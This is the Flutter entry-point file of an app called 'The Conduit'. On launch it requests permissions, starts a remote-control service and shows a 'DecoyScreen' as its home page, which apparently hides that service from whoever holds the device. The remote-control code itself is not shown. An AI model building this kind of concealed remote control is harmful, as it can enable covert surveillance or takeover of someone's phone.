import 'dart:io';

import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';

import 'core/logging/logger_service.dart';
import 'core/remote_control/remote_control_service.dart';
import 'firebase_options.dart';
import 'presentation/decoy_screen/decoy_screen.dart';

// App name
const String appTitle = "The Conduit";

// Create a logger for the main app
final LoggerService _mainLogger = LoggerService("MainApp");

// Function to request necessary permissions
Future<void> _requestRequiredPermissions() async {
  if (!Platform.isAndroid && !Platform.isIOS) {
    _mainLogger.info("Permissions", "Not running on Android/iOS, skipping permission requests");
    return;
  }

  // Request notification permission
  final notificationStatus = await Permission.notification.status;
  _mainLogger.info("Permissions", "Current notification permission status: $notificationStatus");

  if (notificationStatus.isDenied) {
    _mainLogger.info("Permissions", "Requesting notification permission");
    final result = await Permission.notification.request();
    _mainLogger.info("Permissions", "Notification permission result: $result");
  }

  // Request storage permission on Android for saving files
  if (Platform.isAndroid) {
    final storageStatus = await Permission.storage.status;
    _mainLogger.info("Permissions", "Current storage permission status: $storageStatus");
    
    if (storageStatus.isDenied) {
      _mainLogger.info("Permissions", "Requesting storage permission");
      final result = await Permission.storage.request();
      _mainLogger.info("Permissions", "Storage permission result: $result");
    }
  }
}

// Function to check if first launch and set initial security settings
Future<bool> _isFirstLaunch() async {
  const secureStorage = FlutterSecureStorage();
  const firstLaunchKey = 'app_first_launch_completed';
  
  try {
    final value = await secureStorage.read(key: firstLaunchKey);
    if (value == null) {
      _mainLogger.info("AppInitialization", "First launch detected, setting initial security settings");
      
      // Set the flag to indicate first launch completed
      await secureStorage.write(key: firstLaunchKey, value: 'completed');
      
      // Here we can set other initial security settings if needed
      
      return true;
    }
    return false;
  } catch (e, s) {
    _mainLogger.error("AppInitialization", "Error checking first launch", e, s);
    return false;
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  _mainLogger.info("AppStart", "Application starting");
  
  try {
    // Initialize Firebase
    await Firebase.initializeApp(
      options: DefaultFirebaseOptions.currentPlatform,
    );
    _mainLogger.info("Firebase", "Firebase initialized successfully");

    // Request required permissions
    await _requestRequiredPermissions();
    
    // Check if first launch
    final isFirstLaunch = await _isFirstLaunch();
    if (isFirstLaunch) {
      _mainLogger.info("AppInitialization", "First launch setup completed");
    }

    // Initialize remote control service
    try {
      final remoteControlManager = RemoteControlManager();
      await remoteControlManager.initializeService();
      await remoteControlManager.startService();
      _mainLogger.info("RemoteControl", "Remote control service initialized and started");
    } catch (e, s) {
      _mainLogger.error("RemoteControl", "Error initializing remote control service", e, s);
      // Continue with app launch even if remote service fails
    }

    runApp(
      const ProviderScope(
        child: MaterialApp(
          title: appTitle,
          home: DecoyScreen(),
          debugShowCheckedModeBanner: false,
        ),
      ),
    );
    _mainLogger.info("AppStart", "Application UI launched");
  } catch (e, s) {
    _mainLogger.error("AppStart", "Fatal error during app initialization", e, s);
    // Show error UI or gracefully handle the error
    runApp(
      MaterialApp(
        title: 'Error',
        home: Scaffold(
          body: Center(
            child: Text('حدث خطأ أثناء تهيئة التطبيق. الرجاء إعادة المحاولة لاحقًا.'),
          ),
        ),
        debugShowCheckedModeBanner: false,
      ),
    );
  }
}